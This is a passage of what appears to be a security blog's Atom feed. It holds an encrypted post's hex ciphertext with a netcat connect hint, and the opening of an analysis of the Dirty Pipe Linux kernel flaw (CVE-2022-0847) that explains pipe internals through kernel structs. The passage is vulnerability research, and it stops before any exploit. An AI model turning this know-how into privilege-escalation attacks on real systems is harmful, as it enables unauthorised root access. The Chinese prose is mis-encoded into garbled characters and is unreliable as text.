03a5e7bf526f75f993f6ee79d4778f74c96e85ed024a0507e969269e79e3f1812795cdc08171cd14a4000bbfde3a6925035915707ae7b8d878c98f593c3aa6ee8f7311160164239637c1ccfb360448671d38f7b2abe5dbb46b8ff4e7c1b266099d21c14221cddb76c2831841f32d7840eba6ae03e07b1e456d8032584a43f165ce90cd1c7d053c169781b1ab9ce7e231a7340d837ccdd71e87a7009a564697df36bd9cc2ea16a531ec463e1a63d5d1fc780b84a29196c9eadd0ad0c03b06aecc463ff8069d12ef772f0352235a8cc87af8ac305c21f3c8d6b9f08a74d67700fc3fa037395bab8eca94756df69229f78eaebad651b941fbcd63e564f29ae43036014e1d1d8578028b58e0059c3fea05ac24089ec34ee5ee2b299342163cbcb950bd73a55f84aeea24e7f98f736f694eeefd8e1cc2749f2e1d1708badc7a9f5fec25ac1032865a3d42cdc0b61df0d207e2b0a037fdfc7195d225077b5e70885abf953f6b34fa255493ffbb31fd58d36c3e88f3214d195743a3a30f96a7b5bb1b0d273e053be0700d1927d3e3734ab337ec219b50f733d57cf0505e096c5af026bb27983fa1e52562e3ddd59c6e9052c715e2b436a9b4ba3ff7998dc14e7b42842a315f61d7d83eee592008932c7fe54b1b06ec218e130c1aeae699149db4ba263f6af66fea6dc7c0783bd27e469a2b5a4c5785991c3d9448ac74b6e31014c71a7ee78e9854355991239f43a48212cde8520abfd097299f6391369d4043a64b5a7d8c158a3191927cc16e74e76e1d9c9fe80202dbc3f1c9fdfe72e0519229f416546b96708a78f694d48986183cf7070097432de35d68429bd2dd04697fa9756db89020a78e331b4baf7c644bf77b68899f1b6a74c6944edf72ec6dd915f3ebd69adca58a3d6f6cb0dfa9acbc55eef7e6bdf721e0254b2a67106d72e9b2d49a7c3a3558c180d73bea7447e5e750082e11c8f2598e47535b042907a664da8b5f7affbe99180276bd1e21440ff24a924a1bf94dd4f5a8b7ee2fca218da76d8656fdf200a385c387f29153d3a39434a8d2b393313538438590c054bc708b8cefd9432f4c0dccdde9073db7e74295037af894de9d85fa97c19e31acb975c695b2420893e5ad430d74342e0a6438a307fb1db191557c615b8b09bd529d03a97b523a0ee5a2509450db5e5042f85d939d4292f3d4bf43e497fda71873719cbe2917f7ee25006aa984f57486d7e265d61bb470cdf92293538c58766f39ba965a6198861747794f5fa5c60a346803f3d81f683f3bfcc5dc85c363001959b1c2b523b53e14cda801f7ada297ebdb78d05fbbb9bb2cb217ec885b97de4a7dcd892365c97f91b1534829e4098c1a9aa012e4d4fb2bc9b84e646c075cdce9dc2910a9973ec1bdf7fd2782d5f982eb447ac4af53e0b87362d04125e2d187f708e7de5bc594a2802a6b6ef3292dea23209ed34c621ed5d7092e641d8be118f486516ea067b6e7f8bf6bb7b4a3a636659c0e9cc2b0ee8642e348d99d4f68eeacd59e1213388aec0aa421dfb62204fb4701c7be66f7cd54024748b388e4d40d837c9db3117e1eb6af3f4330fb04107ba4a2a9de2a8d132ffafb1e2f3e64efc1a498af42b45d9edf92e39aa9be8b692b3d66f6fc0844d44ec5c9f6175df12e72c945694ab648631086c3e0b7ddc0b5a9e67fa206fc407749866ed01e34caa08b34c54471a566537ab93a1fba428732e85d8425a3aeed35057757aff35c5ca4b4802c0ddfebf1dae97f301b1ac485db80b6b281268677abda466666d072f3cbc5f4458fc06973ea5b1b5da62b7f48f601b7341edb79e8339c7a64d59b345ae6d9150c54a04c3deedbc75e9e468fc721c3447dac60b77a70a344ca17aa2f89d2d34d3ce995015719db8c5dbe1d3a211ea78d942d5bacfa3980975b4b7f0a42f14445f87f2ce9702c51347c708756144b02d7bfc1d8a578b01e99403a729bd6445007667b5e2e9ef3e1ee19d84667aad6ba3a07e33f4e176ca1e699e919ce79de7b58937a6a9f3494239b85da7b87509bef6dacd7d51d1d67633062d972776b2a24ea9006947c3b94b8a8b81868774d73afa6df8c547b2c01752b691b939a82ac1a873aaa3337868621223ffe1b68b4be8a927553456bb48e41bde2812330e3a70cef436ff1b47c5a36e833908aa1a28fa7f88583b6b5b517debda3bdc56d94722b662a041c481f9e5a451b56f9de65d37ecc5099b4bf25178c396ebd013353ace413ed3d72de89c1825fd879f4a83e7cb38c19fc0683cf776c1475313528a644ccc383e343068cabfe1566daba4c6b9e0aa64f925f553f9339b52898085bc76585d0a843a41d541d27b26edd7cc3a50a20835b5b276e1c2d29228d784053e159de34d080cbaf871d0627f0769e59cbc7488530fa9e2b1e2049b9975d919be87cf2e612cbfafaf9c6f29c90d4b14ce81895d82e23c0fac81e26cd8806128990a0d226f489ef56000a7e41942fe9a1014dbadd73f40c05de5cfb6b0eaff9a3447580e02116d679b0cd5036d838deee3e53a6116bf44d3c3491eadda1e82c7a38d758a613a55e2deae2f932e1a3977fb0e53860680994d6ce322cf7a15e0ea7e5f56e12912cf0aebb845259561ba2aaa2d4e234898a292486472a7d6af7505f965f6e38b6ea14e955ffcc155d1fdecc054f33dbc62538755b7124e5704f3f3cdfc34c02ab94644a3757716242d24c416880472507f37d1bf1b92f424d7a8405e51894c1a7009a31585b6d78c1518d51ab93d13065859390072d2f804ac03f552324368fb96c86b46e9d1a04be65e9ecb1ddfbc5360abf3a8287087bd374e699cf543f257ced59f2651344cec9cea9821fc0b4760fccef7a3bca7a6904519d149e17af4621c80fdef690f72c24897c8a1b2b7ddfe0544e97006099b7e8e4e0ffd0680d2825607edbb72465fc0698f3a98245f3335ba065c8aa966c2f066086deaee88a5b88f21aa44aa8fb188fe7306fc867ce913d79e9289478f331647d175c6df199d5c4fcb64f9a29fd4607de750f79d7a2f82a8e2acd3923f52f664b2a2c77166f7558817c604ced8fa7852d3d7ad651a93e15e06b9fee30ec548c3da2c31806f52fbb6895e8b6c2fa5825ddb80b32e66a0bc937b525a4169e2756983c7ba18df94bc2df335af649bdbee9043db939dffc4bd1935aee2a382555379bd0e3be55db97b01f3699a91767e333c3587509b26d2a7c103591433bd793962202c96b5fe567174b46ca0035a7601d1cb87f38bf216ae87034e2e1d0a17edb14a8b0a6110eb6901663514fa39b1e4589d5d1bb79acc356d790e64ebd288876d4b293d6eacc5f2cda88d02cff20b30d2ab78f268243b5979ca7a9c7247cc10f870339e8b13eae04e4281bfbae010fb9faac0601118bfbebd6f72ac2129be1edddf0c8954fd60562bdcb291d0606b30d893939529ec776f89be62c22e9712c14ee89aa28c37dda13ef4f1e1938e3b99184a9912b35d4fca3e313d8752c1f3f9d1be9ee86152adadc2f73758dc3be54d717b51c8b04e69c5c927a6fbd70f73ccbcf9c9c213d7007460a40127b8ccff67ab04e0aa85af4d30e29f54852103974f4702aab027514caaa22f5bfcf008e8a73a1ae7624cc3db573260ff042d32d1d98ddeb20b547f292d9b294dc94e0f932e1c2eb3503c220fa1e52cb1be3b91d50fa5289f50def4b8728a6de707cb7bb5fcddd16528f7ffb79a3786009b64f9e503c5287ead40124ceb50e70ae422ecaf4027bee88a48cca046144ec09f3a5d36895f16f68964590394defe42d6db6255135c901c7268da2fe8809f115c770f6b69ff8968da24ac4ac4ef71bd2d8122395d8bcebca6339b073956c3ef194d8177ae52612c69390e110dc7aa1e2742d48d97e48d1e0d89cb81b9da08923aa88600629f251e6bd1dba66be54ac35d8a68156665a433f2e700af84dfb92bda0579aa22bc0aa2f1d867e483cb98bbeff9eb3a68122e3aa911fc86be4ad7502ca06813dade1082c2f9c0fadb272ab3a563fa2b0aa2062085fba162577659aa7f5887f7db70b71a8c67da7e418725e879a539094f66aad904d1df5d09ee1f84000f410c1b5e0560dd5bae8605994f725927c678865ba4907aef05717b70e22f88a4f3d3ce9a9fe8ffd3176ffa4b8807e7064a4507748f7db47f12ea46b77e0f2120285e0ed59e845d4018f9eebe86f5b9e9f3120180592013ff7111cb430c53346e99acad0354f63b5d04efa367a03944c850c2a74f04b71e86c898f32aee1b7590e8b32914b2c9477f735076239ddf095f1d5d47f23264e0a2bb331add0b378a700c4989f991799c41e501cfa21783416a0dca61087015d7cf395d2ed6caa7cfdf28ca78215f6148701480dc615036cd884aa8c0c307122b6115fdfafefb7a7600fcaee500cfa4b3f3697084f3e7b1e2a03cb7e9633a638af6fbba679d81b1a1f164271530e291b5deaba79ca65e9ed7e72f07db46b7b07df2875e7ae82cb66e05c79245f9cf6b33ff511a53b599c5c33b18a9a0b4bc76d522d63730bbf95e6beff327925afbe1455d9e5507e7a0134d5c2d5d812f1788cb675884ee81fb449bfe86fbc1e04c805876528c9d1ba6f2676970b208b01149972e959469ceeff3dbb12725c1400f21d3ced001dd5c8f6ba14cfb2e43584cfc4faabe0ff0932595e86911f95415df54dc00a9400c9b2086944c1371361dd6a91363d456ed4af0faf63057dafd0cf4cacafeb9ae858b2782106e68d5a1494aee168b8e7e72131ff5eb2de26d1c6f803758917f22e5dbe33248e3ad5673d703c231020892d0efedc16a8cde86afc3ef8e153877a95c367d828e64598aaa37786f127d4c7081494f52fe69ec6360309fb3bf3432e5a00f87f4a902fd9c6c9b0a11a914afd6ad793f6a267fbdb6562da54614c5aa5870a57c964c50fa054be3c3ea81c599eb36e9034d4d98b68106b7d892639d8cfa40b2efa14504a257920397a4244a9fb0e954e14c54097f4e4d88abc917c1f39247079e1003115738fd2496816d4a3c7f93a3d9edc27ab434371de481ae787c0730c94b2b8e02102aad3b69ac193b695a2007a596fdad40fbdb4233a042ad40eb813134456ea4a74eb85226eb2269adda26a448d3ee1601d0fda8805506773c8ce8bd419b41b658aa199c5a5f58b2bfc6a444a1546abf1ab41a700112cda6a973946a1feb9f27dc55c0751317c04ae2a17da65dedb6f8b1276a2ae1471fee864138c783c6a6f381486d31f05af181a9e17c2b03f49a6425866e30ccee40091680925b652f14b57d71e391379b2c61cc6d6b997d2705284eb51c8617dc31783c3fbe2ca32259f5f70c30588dc50576e503f55230f1f31364944c842586d0d08b81927ac6cf77534673947bf5db73202532c2c693a243680998be7203f49336be23577f396ed431edbac2ff7df3ffefcf5d570a3158b70983776e4b65e975e5034de2326d99fd1b98d2bf541911332be7103c8541d11f061563f79736e90d2d6b6cd299744bab5a76bffc1d49d40ddab1d74e06346632ffcd5f83d2436e9b0dda9fb538cabde9fc4aaa387c189395a3642d8308688df868cc29c70e9048fc49dd44a7c131ea76c468ea6764ed34e6f66477177809b77d85da6545f5bdeb9be97107e92251a87d9015cad2ee890137e6f923fd7af94276dba0d4c92b0a2fd34502b596c5fe7e99a3f19d09e85b3175d09fbacbd390ff02c3d4a5075291c8c38306cc460dfd384c1184c084cf98b84f562b2788aa0001c76e6cbdb74e535f76264e8aa7550aa4f233a7a2be0a007d5f8f62ab28cd70683112a6f4c6e7566fbb099e2895a41dd1f2322ae8790e6ccc0ab77cb4649184ea30859532cd18cca30769777b37f17bab78cb5524366c3b8ab07e05b2f207b4da6dfced11eedb8c5951aac7b303067daf171ef629748067cca7ef9eff875e978a4c06c5893c6d0fe207e32ef8975c68ac7cde736ce25ada3a53e668f8caa877b2a180422138025ed7cd9a11062731afc16ff1e597841b4ad28b85c9169ab706d8b4dea536c50726a2f386c95a35cd6a74eb18aec702f8a64b0fd1c3a33bfba0286cd60b5bd02dae5915aafd285163ee37c265ef8e5fd2edf84eca3eb280f18b216d794e11e6c869a123393890ccf5027e75005b41930a895730beba82ff3bbaac483f718d104206f73f9767d88e6e019186dc441d49537a34e1cf1766fa8589cfbfc4542946a1191b2b8979adeae8ac5b499fda865a2dbc671b3d1f910d9bd1eb4c4449d7b424588dc6eb23feecddbed41339160ae8cf77c4ab30e5bf92bee8227008fda2c1f1c478cb090dabd3e9f5801adb4ceb69c0246e2c7d04d6a39346fedd101c2ba88f2b66ac9f767</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">nc sec.arttnba3.cn 25000</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">NEEDY GIRL OVERDOSE</summary>
    
    
    
    <category term="PIECES" scheme="http://blog.arttnba3.cn/categories/PIECES/"/>
    
    
  </entry>
  
  <entry>
    <title>ã€CVE.0x06ã€‘CVE-2022-0847 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ</title>
    <link href="http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/"/>
    <id>http://blog.arttnba3.cn/2022/03/12/CVE-0X06-CVE-2022-0847/</id>
    <published>2022-03-12T11:39:02.000Z</published>
    <updated>2022-03-21T07:45:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>æˆ‘è¶…ï¼Œç®¡äººç—´ï¼</p><span id="more"></span><h1>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>CVE-2022-0847 æ˜¯è¿™ä¸¤å¤©åˆšçˆ†å‡ºæ¥çš„ä¸€ä¸ªçƒ­ä¹çš„å†…æ ¸æ¼æ´ï¼Œæ¼æ´ä¸»è¦å‘ç”Ÿåœ¨å¯¹ç®¡é“è¿›è¡Œæ•°æ®å†™å…¥æ—¶ï¼Œç”±äºæœªå¯¹åŸæœ‰çš„ <code>pipe_buffer-&gt;flags</code> è¿›è¡Œæ¸…ç©ºï¼Œä»è€Œå¯¼è‡´äº†<strong>å¯ä»¥è¶Šæƒå¯¹æ–‡ä»¶è¿›è¡Œå†™å…¥</strong>ï¼›ç”±äºè¿™æ ·çš„æ¼æ´å½¢å¼ç±»ä¼¼äºâ€œè„ç‰›â€ï¼ˆCVE-2016-5195ï¼‰ï¼Œä½†æ›´åŠ å®¹æ˜“è¿›è¡Œåˆ©ç”¨ï¼Œå› æ­¤ç ”ç©¶äººå‘˜å°†è¯¥æ¼æ´ç§°ä¹‹ä¸ºã€ŒDirty Pipeã€</p><p>æ®ç ”ç©¶è€…æè¿°ï¼Œç›®å‰ <strong>5.8 ç‰ˆæœ¬ä»¥ä¸Šçš„å†…æ ¸å‡ä¼šæ”¶åˆ°è¯¥æ¼æ´çš„å½±å“</strong>ï¼Œåœ¨ <strong>5.16.11</strong>ã€<strong>5.15.25</strong>ã€<strong>5.10.102</strong> ç‰ˆæœ¬ä¸­æ‰è¢«ä¿®å¤ï¼Œå½±å“èŒƒå›´ä¸å¯è°“ä¸å¤§ï¼Œå› æ­¤è¿™ä¸ªæ¼æ´ä¹Ÿå¾—åˆ°äº†é«˜è¾¾ 7.8 çš„ CVSS è¯„åˆ†ï¼ˆCVSS è¯„åˆ†å¥½åƒæ”¹ç‰ˆäº†ï¼Œ2.0 çš„æ ‡å‡†åªæœ‰ 7.2åˆ†ï¼‰</p><p>è¿™ä¸ªæ¼æ´çš„å‘ç°æºè‡ªäºä¸€æ¬¡ CRC æ ¡éªŒå¤±è´¥ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥çœ‹<a href="https://dirtypipe.cm4all.com/">åŸä½œè€…çš„åšå®¢</a>ï¼Œæ˜¯ä¸€æ®µååˆ†å¥‡å¦™çš„æ—…ç¨‹ï¼ˆç¬‘ï¼‰</p><p>æœ¬æ¬¡é€‰ç”¨è¿›è¡Œåˆ†æçš„å†…æ ¸æºç ä¸º Linux 5.13.19ï¼ˆå› ä¸ºç¬”è€…å‰äº›å¤©åˆšå¥½ç¼–è¯‘äº†ä¸€ä¸ªè¿™ä¸ªç‰ˆæœ¬çš„å†…æ ¸ï¼Œåˆšå¥½å—åˆ°è¯¥æ¼æ´å½±å“ï¼Œå°±ç›´æ¥æ‹¿æ¥ç”¨äº†ï¼‰</p><p>åœ¨å¼€å§‹åˆ†æä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è¡¥å……ä¸€äº›å‰ç½®çŸ¥è¯†</p><h2 id="pipeï¼šç®¡é“">pipeï¼šç®¡é“</h2><p>ç¨å¾®æ¥è§¦è¿‡ Linux çš„åŒå­¦åº”è¯¥éƒ½çŸ¥é“ã€Œç®¡é“ã€è¿™ä¸€ IPC ç¥å™¨ã€‚è€Œåœ¨ Linux å†…æ ¸ä¸­ï¼Œç®¡é“æœ¬è´¨ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ª<strong>è™šæ‹Ÿçš„ inode</strong> ï¼ˆå³åˆ›å»ºäº†ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶èŠ‚ç‚¹ï¼‰æ¥è¡¨ç¤ºçš„ï¼Œå…¶ä¸­åœ¨èŠ‚ç‚¹ä¸Šå­˜æ”¾ç®¡é“ä¿¡æ¯çš„æ˜¯ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“ï¼ˆ<code>inode-&gt;i_pipe</code>ï¼‰ï¼Œå…¶ä¸­åŒ…å«äº†ä¸€ä¸ªç®¡é“çš„æ‰€æœ‰ä¿¡æ¯</p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œå†…æ ¸ä¼šåˆ›å»ºä¸€ä¸ª VFS inode ã€ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“ã€ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼ˆä»£è¡¨ç€ç®¡é“çš„ä¸¤ç«¯ï¼‰ã€ä¸€ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“æ•°ç»„ï¼Œä¸‹å›¾æ˜¯ä¸€å¼ å™è¿°ç®¡é“åŸç†çš„ç»å…¸å›¾ä¾‹</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="éå¸¸ç»å…¸çš„ä¸€å¼ å›¾"></p><p>ç”¨æ¥è¡¨ç¤ºç®¡é“ä¸­æ•°æ®çš„æ˜¯ä¸€ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“æ•°ç»„ï¼Œå•ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“ç”¨æ¥è¡¨ç¤º<strong>ç®¡é“ä¸­å•å¼ å†…å­˜é¡µçš„æ•°æ®</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: ç®¡é“ç¼“å†²åŒºä¸­å­˜æ”¾äº†æ•°æ®çš„é¡µæ¡†</span><br><span class="hljs-comment"> *@offset: åœ¨ @page ä¸­æ•°æ®çš„åç§»</span><br><span class="hljs-comment"> *@len: åœ¨ @page ä¸­æ•°æ®çš„é•¿åº¦</span><br><span class="hljs-comment"> *@ops: è¯¥ buffer çš„å‡½æ•°è¡¨ï¼Œ å‚è§ @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: ç®¡é“ç¼“å†²åŒºçš„æ ‡å¿—ä½ï¼Œå‚è§ä¸Šé¢</span><br><span class="hljs-comment"> *@private: å‡½æ•°è¡¨çš„ç§æœ‰æ•°æ®</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åˆ›å»ºç®¡é“ä½¿ç”¨çš„ pipe ä¸ pipe2 è¿™ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨æœ€ç»ˆéƒ½ä¼šè°ƒç”¨åˆ° <code>do_pipe2()</code> è¿™ä¸ªå‡½æ•°ï¼Œä¸åŒçš„æ˜¯åè€…æˆ‘ä»¬å¯ä»¥æŒ‡å®šä¸€ä¸ª flagï¼Œè€Œå‰è€…é»˜è®¤ flag ä¸º 0</p><p>å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">do_pipe2</span>()</span><br><span class="hljs-function"><span class="hljs-title">__do_pipe_flags</span>()</span><br><span class="hljs-function"><span class="hljs-title">create_pipe_files</span>()</span><br><span class="hljs-function"><span class="hljs-title">get_pipe_inode</span>()</span><br><span class="hljs-function"><span class="hljs-title">alloc_pipe_info</span>()</span><br></code></pre></td></tr></table></figure><p>æœ€ç»ˆè°ƒç”¨ <code>kcalloc()</code> åˆ†é…ä¸€ä¸ª <code>pipe_buffer</code> æ•°ç»„ï¼Œé»˜è®¤æ•°é‡ä¸º <code>PIPE_DEF_BUFFERS</code> ï¼ˆ16ï¼‰ä¸ªï¼Œå³ä¸€ä¸ªç®¡é“åˆå§‹é»˜è®¤å¯ä»¥å­˜æ”¾ 16 å¼ é¡µé¢çš„æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> pipe_bufs = PIPE_DEF_BUFFERS;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span> =</span> get_current_user();<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> user_bufs;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_size = READ_ONCE(pipe_max_size);<br><br>pipe = kzalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_inode_info), GFP_KERNEL_ACCOUNT);<br><br>    <span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>ç®¡é“å½¢æˆçš„æ ¸å¿ƒç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/03/12/cyUY4fmwHr5I6ts.png" alt="image.png"></p><blockquote><p>page ç»“æ„ä½“ç”¨ä»¥<strong>å”¯ä¸€æ ‡è¯†ä¸€ä¸ªç‰©ç†é¡µæ¡†</strong>ï¼Œå‚è§ <a href="https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/">https://arttnba3.cn/2021/11/28/NOTE-0X07-LINUX-KERNEL-MEMORY-5.11-PART-I/</a></p></blockquote><p>ç®¡é“çš„æœ¬ä½“æ˜¯ä¸€ä¸ª <code>pipe_inode_info</code> ç»“æ„ä½“ï¼Œå…¶ç®¡ç† <code>pipe_buffer</code> æ•°ç»„çš„æ–¹å¼<strong>æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªå¾ªç¯é˜Ÿåˆ—</strong>ï¼Œå…¶ head æˆå‘˜æ ‡è¯†é˜Ÿåˆ—å¤´çš„ idxï¼Œtail æˆå‘˜æ ‡è¯†é˜Ÿåˆ—å°¾çš„ idxï¼Œ<strong>å¤´è¿›å°¾å‡º</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_inode_info - a linux kernel pipe</span><br><span class="hljs-comment"> *@mutex: ä¿æŠ¤ä¸€åˆ‡çš„äº’æ–¥é”</span><br><span class="hljs-comment"> *@rd_wait: ç©ºç®¡é“ä¸­è¯»è€…çš„ç­‰å¾…ç‚¹</span><br><span class="hljs-comment"> *@wr_wait: æ»¡ç®¡é“ä¸­å†™è€…çš„ç­‰å¾…ç‚¹</span><br><span class="hljs-comment"> *@head: ç¼“å†²åŒºçš„ç”Ÿäº§ç‚¹</span><br><span class="hljs-comment"> *@tail: ç¼“å†²åŒºçš„æ¶ˆè´¹ç‚¹</span><br><span class="hljs-comment"> *@note_loss: ä¸‹ä¸€æ¬¡ read() åº”å½“æ’å…¥ä¸€ä¸ª data-lost æ¶ˆæ¯</span><br><span class="hljs-comment"> *@max_usage: åœ¨ç¯ä¸­ä½¿ç”¨çš„ slots çš„æœ€å¤§æ•°é‡</span><br><span class="hljs-comment"> *@ring_size: ç¼“å†²åŒºçš„æ€»æ•° (åº”å½“ä¸º 2 çš„å¹‚æ¬¡)</span><br><span class="hljs-comment"> *@nr_accounted: The amount this pipe accounts for in user-&gt;pipe_bufs</span><br><span class="hljs-comment"> *@tmp_page: ç¼“å­˜çš„å·²é‡Šæ”¾çš„é¡µé¢</span><br><span class="hljs-comment"> *@readers: ç®¡é“ä¸­ç°æœ‰çš„è¯»è€…æ•°é‡</span><br><span class="hljs-comment"> *@writers: ç®¡é“ä¸­ç°æœ‰çš„å†™è€…æ•°é‡</span><br><span class="hljs-comment"> *@files: å¼•ç”¨äº†è¯¥ç®¡é“çš„ file ç»“æ„ä½“æ•°é‡ (protected by -&gt;i_lock)</span><br><span class="hljs-comment"> *@r_counter: è¯»è€…è®¡æ•°å™¨</span><br><span class="hljs-comment"> *@w_counter: å†™è€…è®¡æ•°å™¨</span><br><span class="hljs-comment"> *@fasync_readers: reader side fasync</span><br><span class="hljs-comment"> *@fasync_writers: writer side fasync</span><br><span class="hljs-comment"> *@bufs: ç®¡é“ç¼“å†²åŒºå¾ªç¯æ•°ç»„</span><br><span class="hljs-comment"> *@user: åˆ›å»ºè¯¥ç®¡é“çš„ç”¨æˆ·</span><br><span class="hljs-comment"> *@watch_queue: If this pipe is a watch_queue, this is the stuff for that</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">mutex</span>;</span><br><span class="hljs-type">wait_queue_head_t</span> rd_wait, wr_wait;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tail;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_usage;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> ring_size;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span><br><span class="hljs-type">bool</span> note_loss;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_accounted;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> readers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> writers;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> files;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> r_counter;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> w_counter;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">tmp_page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_readers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fasync_struct</span> *<span class="hljs-title">fasync_writers</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-class"><span 